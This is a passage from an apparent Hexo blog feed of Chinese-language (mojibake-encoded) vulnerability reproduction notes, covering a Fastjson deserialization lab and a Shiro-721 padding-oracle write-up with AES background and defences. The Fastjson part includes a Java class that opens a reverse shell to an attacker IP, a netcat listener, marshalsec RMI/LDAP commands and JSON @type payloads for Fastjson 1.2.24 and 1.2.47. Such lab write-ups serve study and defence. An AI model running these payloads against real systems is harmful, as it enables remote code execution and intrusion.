<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œç¼–è¯‘<code>javac Exploit.java</code>ç”ŸæˆExploit.class</p>
<p>æŠŠç¼–è¯‘å¥½çš„Exploit.classæ”¾åœ¨kaliä¸Š</p>
<h5 id="kaliç›‘å¬8888ç«¯å£"><a href="#kaliç›‘å¬8888ç«¯å£" class="headerlink" title="kaliç›‘å¬8888ç«¯å£"></a>kaliç›‘å¬8888ç«¯å£</h5><p><code>nc -lvvp 8888</code></p>
<h5 id="å¯åŠ¨RMIæœåŠ¡"><a href="#å¯åŠ¨RMIæœåŠ¡" class="headerlink" title="å¯åŠ¨RMIæœåŠ¡"></a>å¯åŠ¨RMIæœåŠ¡</h5><p>ä½¿ç”¨marshalsecé¡¹ç›®ï¼Œå¯åŠ¨RMIæœåŠ¡ï¼Œç›‘å¬8001ç«¯å£å¹¶åŠ è½½è¿œç¨‹ç±»Exploit.class(marshalsecå’Œç¼–è¯‘åçš„Exploit.classæ”¾åœ¨åŒä¸€ç›®å½•ä¸‹)</p>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
<blockquote>
<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer â€œ<a href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<ul>
<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading messageâ€¦<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use â€“illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
</ul>
</blockquote>
<p>åŸå› è²Œä¼¼æ˜¯å› ä¸ºjavaç‰ˆæœ¬è¿‡é«˜ï¼Œè¿™é‡Œé»˜è®¤ä½¿ç”¨çš„æˆ‘æ˜¨å¤©åˆšå®‰è£…çš„javac11,æ¢ä¸€ä¸ªä½ç‰ˆæœ¬çš„javacå»è¿›è¡Œç¼–è¯‘,ä½†æ˜¯è¿˜æ˜¯æ— æ³•åå¼¹shell.</p>
<p>æŸ¥äº†åŠä¸ªä¸‹åˆï¼Œæœ€ç»ˆå‘ç°æ˜¯å› ä¸ºkali çš„javaç‰ˆæœ¬é—®é¢˜ï¼ŒkaliåŸjavaç‰ˆæœ¬ä¸ºjava11,ç„¶åå®‰è£…äº†java8 å†å»å¼€å¯rmiæœåŠ¡å°±æ­£å¸¸äº†</p>
<p><img src="/posts/37afa0e0/rmi1.png"></p>
<p>æˆåŠŸåå¼¹shell</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.47</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="LDAPæ–¹å¼"><a href="#LDAPæ–¹å¼" class="headerlink" title="LDAPæ–¹å¼"></a>LDAPæ–¹å¼</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
<p><img src="/posts/37afa0e0/ldap1.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.20.129:8002&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
<p><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
<p><a href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro721å¤ç°</title>
    <url>/posts/700536f4/</url>
    <content><![CDATA[<h3 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h3><p>shiroé‡‡ç”¨äº†AES-128-CBCçš„æ¨¡å¼å¯¹cookieè¿›è¡ŒåŠ å¯†ï¼Œè¿™ç§åŠ å¯†æ–¹å¼å¯ä»¥ä½¿ç”¨Padding Oracle Attack( Oracle å¡«å……æ”»å‡» ) ,ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ„é€ æ¶æ„çš„RememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œä»è€Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œ.</p>
<p>å½±å“ç‰ˆæœ¬: Apache Shiro  1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1ç‰ˆæœ¬</p>
<br>

<br>

<h3 id="AESåŠ å¯†"><a href="#AESåŠ å¯†" class="headerlink" title="AESåŠ å¯†"></a>AESåŠ å¯†</h3><p>AES/128/CBC/PKCS5Padding åŠ å¯†</p>
<p>AESæ˜¯ä¸€æ¬¾å¯¹ç§°åŠ å¯† ,åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œè¿™ä¸ªä¹¦ä¸Šæœ‰ä»‹ç»è¿‡ï¼Œä¸è¿‡æœ€è¿‘ä¹¦æ²¡åœ¨æ—è¾¹ï¼Œå‚è€ƒäº†ä¸‹å¸ˆå‚…ä»¬åšå®¢ </p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<h4 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h4><p>AESçš„åŠ å¯†æ ‡å‡†ä¸­ï¼Œæ¯ä¸ªåˆ†ç»„çš„ é•¿åº¦å›ºå®šä¸º128bits(16Bytes)ï¼Œå¯†é’¥é•¿åº¦ä¸º128bits,192bits,256bits,ä¸åŒçš„å¯†é’¥é•¿åº¦æœ‰ä¸åŒçš„åŠ å¯†è½®æ•°,æ ¹æ®é•¿åº¦ä¸åŒå¯ä»¥åˆ†ä¸ºAES-128,AES-192,AES-256.</p>
<table>
<thead>
<tr>
<th>AESåŠ å¯†</th>
<th>å¯†é’¥é•¿åº¦</th>
<th>åˆ†ç»„é•¿åº¦</th>
<th>åŠ å¯†è½®æ•°</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>128bits</td>
<td>128bits</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>192bits</td>
<td>128bits</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>256bits</td>
<td>128bits</td>
<td>14</td>
</tr>
</tbody></table>
<h4 id="åŠ å¯†æ­¥éª¤"><a href="#åŠ å¯†æ­¥éª¤" class="headerlink" title="åŠ å¯†æ­¥éª¤"></a>åŠ å¯†æ­¥éª¤</h4><p>åˆå§‹è½®        </p>
<ul>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>æ™®é€šè½®        </p>
<ul>
<li>å­—èŠ‚æ›¿æ¢    ï¼ˆSubBytesï¼‰</li>
<li>è¡Œä½ç§»ï¼ˆShiftRowsï¼‰</li>
<li>åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰</li>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>æœ€ç»ˆè½®        </p>
<ul>
<li>å­—èŠ‚æ›¿æ¢ ï¼ˆSubBytesï¼‰</li>
<li>è¡Œä½ç§» ï¼ˆShiftRowsï¼‰</li>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>å…·ä½“åŠ å¯†æ­¥éª¤è¯¦è§£å¦‚ä¸‹</p>
<h5 id="å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰"><a href="#å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰" class="headerlink" title="å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰"></a>å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰</h5><p>AES å­—èŠ‚æ›¿æ¢çš„è¿‡ç¨‹å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæŸ¥è¡¨çš„è¿‡ç¨‹,AESæä¾›äº†Sç›’å’Œé€†Sç›’ï¼Œ</p>
<p>å­—èŠ‚çš„é«˜å››ä½ä½œä¸ºè¡Œï¼Œå­—èŠ‚åº•å››ä½ä¸ºåˆ—å€¼ï¼Œç„¶åæ ¹æ®sç›’ä¸­çš„å¯¹åº”çš„å€¼ä½œä¸ºè¾“å‡ºï¼Œå›¾ä¸­ç»™å‡ºä¾‹å¦‚ï¼ŒåŠ å¯†æ—¶è¾“å‡ºçš„å­—èŠ‚S1ä¸º0x12ï¼ŒæŸ¥Sç›’çš„ç¬¬1è¡Œ ï¼Œç¬¬2åˆ—ï¼Œå¾—åˆ°çš„å€¼ä¸º 0xc9</p>
<p>0xABï¼ŒæŸ¥Sç›’ç¬¬Aè¡Œï¼Œç¬¬Båˆ—ï¼Œå¾—åˆ°å€¼ä¸º0x62</p>
<p><img src="/posts/700536f4/s.png"></p>
<p><img src="/posts/700536f4/%5Es.png"></p>
<p><img src="/posts/700536f4/SubBytes.png"></p>
<p><img src="/posts/700536f4/SubBytes2.png"></p>
<h5 id="è¡Œä½ç§»ï¼ˆShiftRowsï¼‰"><a href="#è¡Œä½ç§»ï¼ˆShiftRowsï¼‰" class="headerlink" title="è¡Œä½ç§»ï¼ˆShiftRowsï¼‰"></a>è¡Œä½ç§»ï¼ˆShiftRowsï¼‰</h5><p>è¡Œä½ç§»ï¼Œå¯ä»¥ç†è§£ä¸ºå·¦å¾ªç¯ç§»ä½çš„æ“ä½œ</p>
<p><img src="/posts/700536f4/ShiftRows.png"></p>
<p><img src="/posts/700536f4/ShiftRows2.PNG"></p>
<p>è¡Œä½ç§»çš„é€†å˜æ¢ç›¸åï¼Œä¸ºå·¦å¾ªç¯ä½ç§»</p>
<h5 id="åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰"><a href="#åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰" class="headerlink" title="åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰"></a>åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰</h5><p>åˆ—æ··åˆå˜æ¢  å°±æ˜¯çŸ©é˜µç›¸ä¹˜,è¡Œä½ç§»åçš„çŠ¶æ€çŸ©é˜µç›’å›ºå®šçŸ©é˜µç›¸ä¹˜</p>
<p><img src="/posts/700536f4/MixColumns.png"></p>
<h5 id="è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰"><a href="#è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰" class="headerlink" title="è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰"></a>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</h5><p>è½®å¯†é’¥åŠ æ—¶iå°†128ä¸ºçš„è½®å¯†é’¥Kiå’Œç›¸åŒçŠ¶æ€çš„çŸ©é˜µä¸­çš„æ•°æ®é€ä½è¿›è¡Œå¼‚æˆ–è¿ç®—</p>
<p><img src="/posts/700536f4/AddRoundKey.png"></p>
<p>a[i,j]ä¸k[i,j]å¼‚æˆ–ï¼Œè¾“å‡ºb[i,j]</p>
<br>

<h4 id="åŠ å¯†æ¨¡å¼"><a href="#åŠ å¯†æ¨¡å¼" class="headerlink" title="åŠ å¯†æ¨¡å¼"></a>åŠ å¯†æ¨¡å¼</h4><p>AESåˆ†ç»„åŠ å¯†çš„åŠ å¯†æ¨¡å¼ï¼Œå…±äº”ç§å¯é€‰åŠ å¯†æ¨¡å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECS ( Electronic Codebook Book , ç”µè¯æœ¬æ¨¡å¼ )</span><br><span class="line">CBC ( Cipher Block Chaining , å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ )</span><br><span class="line">CTR ( Counter , è®¡ç®—å™¨æ¨¡å¼ )</span><br><span class="line">CFB ( Cipher FeedBack , å¯†ç åé¦ˆæ¨¡å¼ )</span><br><span class="line">OFB ( Output FeedBack , è¾“å‡ºåé¦ˆæ¨¡å¼ )</span><br></pre></td></tr></table></figure>

<p>åœ¨shiroä¸­ä½¿ç”¨çš„ä¸ºCBCçš„åŠ å¯†æ¨¡å¼ï¼Œ</p>
<blockquote>
<p>CBCåŠ å¯†æ¨¡å¼: å°†æ˜æ–‡åˆ‡åˆ†æˆè‹¥å¹²å°æ®µ , ç„¶åæ¯ä¸€æ®µåˆ†åˆ«ä¸ä¸Šä¸€æ®µçš„å¯†æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®— , å†ä¸å¯†é’¥è¿›è¡ŒåŠ å¯† , ç”Ÿæˆæœ¬æ®µæ˜æ–‡çš„å¯†æ–‡ , è¿™æ®µå¯†æ–‡ç”¨äºä¸‹ä¸€æ®µæ˜æ–‡çš„åŠ å¯†</p>
<p>ç¬¬ä¸€æ®µæ˜æ–‡æ²¡æœ‰å¯¹åº”çš„å¯†æ–‡ï¼Œä¿è¯åˆ†ç»„çš„å”¯ä¸€æ€§ï¼ŒCBCåŠ å¯†æ¨¡å¼ä½¿ç”¨äº†åˆå§‹åŒ–å‘é‡ï¼ˆIV , Initialization Vectorï¼‰åˆå§‹åŒ–å‘é‡æ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„éšæœºæ•° , è¯¥å‘é‡ä¼šä½œä¸ºå¯†æ–‡ç¬¬ä¸€ä¸ªå— , éšå¯†æ–‡ä¸€åŒä¼ è¾“ .</p>
<p>åœ¨ CBC æ¨¡å¼ä¸­ , åˆå§‹åŒ–å‘é‡( IV ) çš„é•¿åº¦ä¸åˆ†ç»„å¤§å°ç›¸åŒ , ä¸º 16 Bytes( 128 bits ) , å› ä¸ºé“¾æ¥æ¨¡å¼ä¸­çš„å¼‚æˆ–æ“ä½œæ˜¯ç­‰é•¿æ“ä½œ</p>
</blockquote>
<p><img src="/posts/700536f4/aes_Cbc_encryption-squashed.jpg"></p>
<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<h5 id="åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼"><a href="#åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼" class="headerlink" title="åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼"></a>åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼</h5><p>å¡«å……æœ‰å…­ç§ï¼šNoPadding, PKCS#5, PKCS#7, ISO 10126, ANSI X9.23å’ŒZerosPadding</p>
<ul>
<li><p>Nopadding</p>
<p>  ä¸è¿›è¡Œå¡«å……</p>
</li>
<li><p>PKCS#7 &amp; PKCS#5</p>
<p>  ç¼ºå°‘å‡ ä¸ªå­—èŠ‚å°±å¡«å……å‡ ä¸ªå­—èŠ‚ï¼Œå€¼ä¸ºå¡«å……çš„å­—èŠ‚æ•°  </p>
</li>
</ul>
<blockquote>
<p>ä¾‹å¦‚,AAAAAAAA  BBBBBBBB CCCCCCCC    åˆšå¥½åˆ†æˆ3ä¸ªåˆ†ç»„<br>        AAAAAAAA  BBBBBBBB CCCCC            ç¼ºå°‘3ä¸ªå­—èŠ‚ æ‰€ä»¥ä½¿ç”¨ 0x03è¿›è¡Œå¡«å……<br>       (è¿™é‡Œä¾‹å­çš„A B C å‡è§†ä¸ºä¸€ä¸ªå­—èŠ‚)</p>
</blockquote>
<blockquote>
<p>ä¸åŒåœ¨äºPKCS5é™å®šäº†å—å¤§å°ä¸º8bytesè€ŒPKCS7æ²¡æœ‰é™å®šï¼Œåœ¨AESåŠ å¯†å½“ä¸­ä¸¥æ ¼æ¥è¯´æ˜¯ä¸èƒ½ä½¿ç”¨pkcs5çš„ï¼Œå› ä¸ºAESçš„å—å¤§å°æ˜¯16bytesè€Œpkcs5åªèƒ½ç”¨äº8bytesï¼Œé€šå¸¸æˆ‘ä»¬åœ¨AESåŠ å¯†ä¸­æ‰€è¯´çš„pkcs5æŒ‡çš„å°±æ˜¯pkcs7ï¼    â€”-åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°çš„</p>
</blockquote>
<ul>
<li><p>ISO 10126</p>
<p>  æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å¡«å……çš„å­—èŠ‚æ•°ï¼ˆåŒ…æ‹¬æœ€åä¸€å­—èŠ‚ï¼‰ï¼Œå…¶ä»–å…¨éƒ¨å¡«éšæœºæ•°</p>
</li>
</ul>
<blockquote>
<p>ç›´æ¥å¼•ç”¨å¸ˆå‚…çš„ä¾‹å­</p>
<p>â€¦ | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | â€¦ </p>
</blockquote>
<ul>
<li><p>ANSI X9.23</p>
<p>  å’ŒISO 10126å·®ä¸å¤šï¼Œæœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å¡«å……çš„å­—èŠ‚æ•°ï¼ŒåŒºåˆ«åœ¨ è¿™ç§æ–¹æ³•å¡«å……çš„å…¶ä»–å­—èŠ‚éƒ½æ˜¯0ï¼Œè€Œä¸æ˜¯éšæœºæ•°</p>
</li>
<li><p>ZerosPadding</p>
<p>  ç¼ºå°‘çš„å­—èŠ‚å…¨éƒ¨ä½¿ç”¨ <code>0x00</code>å¡«å……</p>
</li>
</ul>
<br>

<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>AESåŠ å¯†å¤§ä½“ä¸Šæœ‰æ‰€äº†è§£äº†ï¼Œå†å›åˆ°shiroä¸Šæ¥ï¼Œçœ‹ä¸€ä¸‹ AES/CBC/PKCS5Padding å³å¯</p>
<p><img src="/posts/700536f4/PKCS5Padding.png"></p>
<br>

<h4 id="Padding-Oracle-Attack-å¡«å……-Oracle-æ”»å‡»"><a href="#Padding-Oracle-Attack-å¡«å……-Oracle-æ”»å‡»" class="headerlink" title="Padding Oracle Attack( å¡«å…… Oracle æ”»å‡» )"></a>Padding Oracle Attack( å¡«å…… Oracle æ”»å‡» )</h4><p>æ˜¯æŒ‡ä½¿ç”¨å¯†æ–‡çš„å¡«å……éªŒè¯ä¿¡æ¯æ¥è¿›è¡Œè§£å¯†çš„æ”»å‡»æ–¹æ³•,ä¹Ÿå°±æ˜¯é€šè¿‡åŠ å¯†æ•°æ®è§£å¯†åéªŒè¯å¡«å……æ˜¯å¦æ­£ç¡®çš„æ–¹å¼</p>
<p>ä¾‹å¦‚</p>
<p>ç”¨æˆ·å»è¯·æ±‚ <code>http://www.example.com?id=xxxxxxxxxxx</code></p>
<p>æœåŠ¡ç«¯æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„æ•°æ®åï¼Œä¼šå¯¹å‚æ•°å€¼è¿›è¡ŒAESè§£å¯†å¤„ç†:</p>
<ul>
<li>å¯†æ–‡æ— æ•ˆ        =&gt;    ç”¨æˆ·ä¸å­˜åœ¨ã€‚è¿”å›http 500</li>
<li>å¯†æ–‡æœ‰æ•ˆ,å¡«å……æœ‰æ•ˆ        =&gt;    ç”¨æˆ·å­˜åœ¨ï¼Œç™»é™†æˆåŠŸã€‚è¿”å›htto 200</li>
<li>å¯†æ–‡æœ‰æ•ˆ,å¡«å……æ— æ•ˆ        =&gt;    è‡ªå®šä¹‰æŠ¥é”™ã€‚è¿”å›http 30X</li>
</ul>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡å¯¹å¡«å……è¿›è¡Œçˆ†ç ´æ¥ç¡®å®šæœ‰æ•ˆçš„å¡«å……å€¼</p>
<br>

<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<p>Ciphertexté€šè¿‡Keyè§£å¯†ä¸ºMidvalue,ç„¶åmidvalueå’ŒIVè¿›è¡Œå¼‚æˆ–å¤„ç†å¾—åˆ°Plaintext</p>
<p>é‚£å¯ä»¥å»åˆ›å»ºä¸€ä¸ªFuzzIV è®©å®ƒä¸Midvalueè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°Plaintextåå†å»éªŒè¯å¡«å……æ˜¯å¦æœ‰æ•ˆ</p>
<p>PKCS5Padding ä¸­ paddingçš„æœ‰æ•ˆèŒƒå›´ä¸º0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 åˆ° 0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 ä¹‹é—´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FuzzIV[i] ^ Midvalue[i] &#x3D; 0x01  &#x3D;&gt; Midvalue[i] &#x3D; FuzzIV[i] ^ 0x01</span><br><span class="line"> &#x3D;&#x3D;&#x3D;&gt;</span><br><span class="line">IV[i] ^ Midvalue[i] &#x3D; Plaintext[i] &#x3D;&gt; Plaintext[i] &#x3D; IV[i] ^ FuzzIV[i] ^ 0x01</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå¾—åˆ° <code>Plaintext[i] = IV[i] ^ FuzzIV[i] ^ 0x01</code>, è€ŒIVå’ŒFuzzIVæ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥å¾—åˆ°Plaintextçš„å€¼,è¿™å°±æ˜¯ Padding Oracle Attack çš„æ”»å‡»åŸç†</p>
<br>

<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="æ¼æ´æ­å»º"><a href="#æ¼æ´æ­å»º" class="headerlink" title="æ¼æ´æ­å»º"></a>æ¼æ´æ­å»º</h4><p>è·å–dockfile</p>
<p><code>git clone https://github.com/3ndz/Shiro-721.git</code><br><code>cd Shiro-721/Docker</code></p>
<p>æ„å»ºå¹¶è¿è¡Œ</p>
<p><code>docker build -t shiro-721 .  </code></p>
<p><code>docker run -p 8080:8080 -d shiro-721</code></p>
<p>å°è¯•ç™»å½•  root/secretï¼Œå‹¾é€‰RememberMe</p>
<p><img src="/posts/700536f4/login_success_rem.png"></p>
<p>å¯ä»¥çœ‹åˆ° <code>Set-Cookie: rememberMe=deleteMe</code></p>
<br>

<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>ä½¿ç”¨burpæŠ“å–rememberMe</p>
<p><img src="/posts/700536f4/exp1.png"></p>
<p>éœ€è¦çˆ†ç ´å¾ˆé•¿æ—¶é—´â€¦ â€¦ç”¨äº†åŠä¸ªå¤šå°æ—¶â€¦</p>
<p><img src="/posts/700536f4/exp2.png"></p>
<p><img src="/posts/700536f4/exp3.png"></p>
<p>æœ€ç»ˆæˆåŠŸåå¼¹shell</p>
<br>

<h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><ul>
<li>å‡çº§ Shiroç‰ˆæœ¬</li>
<li>ä½¿ç”¨wafæ‹¦æˆªè¿‡äºé¢‘ç¹è®¿é—®çš„ip</li>
<li>ä½¿ç”¨wafæ‹¦æˆªCookieä¸­é•¿åº¦è¿‡å¤§çš„RememberMeå€¼</li>
<li>å‡çº§jdkç‰ˆæœ¬</li>
</ul>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/14077791.html">https://www.cnblogs.com/backlion/p/14077791.html</a></p>
<p><a href="https://www.yuque.com/m1tang/gqsay7/qwegln">https://www.yuque.com/m1tang/gqsay7/qwegln</a></p>
<p><a href="https://www.bilibili.com/video/BV1yX4y1V75c">https://www.bilibili.com/video/BV1yX4y1V75c</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/131324301">https://zhuanlan.zhihu.com/p/131324301</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoé¦–é¡µåªæ˜¾ç¤ºéƒ¨åˆ†æ‘˜è¦ï¼ˆä¸æ˜¾ç¤ºå…¨æ–‡ï¼‰</title>
    <url>/posts/2825537d/</url>
    <content><![CDATA[<p>åœ¨nextä¸»é¢˜d_config.ymlä¸­æ›´æ”¹è®¾ç½®(é»˜è®¤å®‰è£…æ—¶å°±æ‰“å¼€äº†)</p>
<blockquote>
